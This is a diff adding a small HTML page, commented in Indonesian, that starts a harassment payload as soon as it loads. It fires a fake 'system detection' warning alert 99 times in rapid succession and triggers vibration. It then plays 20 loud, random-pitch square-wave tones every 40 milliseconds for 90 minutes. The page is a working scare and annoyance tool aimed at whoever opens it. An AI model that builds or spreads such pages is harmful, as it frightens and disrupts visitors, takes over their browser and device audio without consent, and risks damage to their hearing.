@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>index.html</title>
+<style>
+body { margin:0; height:100vh; background:#00ff00; }
+</style>
+</head>
+<body>
+
+<script>
+// ===== ALERT + GETAR =====
+let count=0;
+function firstAlertAndStartAudio(){
+  alert("‼️⛔⚠️SISTEM DEKTEKSI⚠️⛔‼️"); // ini jadi interaksi user
+  if(navigator.vibrate) navigator.vibrate(1);
+  count++;
+
+  const ctx = new (window.AudioContext || window.webkitAudioContext)();
+  ultraBrutalLoop(ctx);
+  startAlertLoop(); // lanjut alert 98 kali berikutnya
+}
+
+function startAlertLoop(){
+  const spam=setInterval(()=>{
+    alert("‼️⛔⚠️SISTEM DEKTEKSI⚠️⛔‼️");
+    if(navigator.vibrate) navigator.vibrate(1);
+    count++;
+    if(count>=99) clearInterval(spam);
+  },1);
+}
+
+// ===== AUDIO ULTRA BRUTAL =====
+function ultraBrutalBeep(ctx){
+  for(let i=0;i<20;i++){
+    const o=ctx.createOscillator();
+    o.type="square";
+    o.frequency.value=Math.random()*(6000-400)+400;
+    const g=ctx.createGain();
+    g.gain.value=0.35;
+    o.connect(g);
+    g.connect(ctx.destination);
+    const t=ctx.currentTime+i*0.005;
+    o.start(t);
+    o.stop(t+4);
+  }
+}
+
+function ultraBrutalLoop(ctx){
+  const end=Date.now()+90*60*1000; // 90 menit
+  const interval=setInterval(()=>{
+    ultraBrutalBeep(ctx);
+    if(Date.now()>end) clearInterval(interval);
+  },40);
+}
+
+// ===== AUTO START SAAT HALAMAN DIBUKA =====
+window.addEventListener("load", firstAlertAndStartAudio);
+</script>
+
+</body>
+</html>
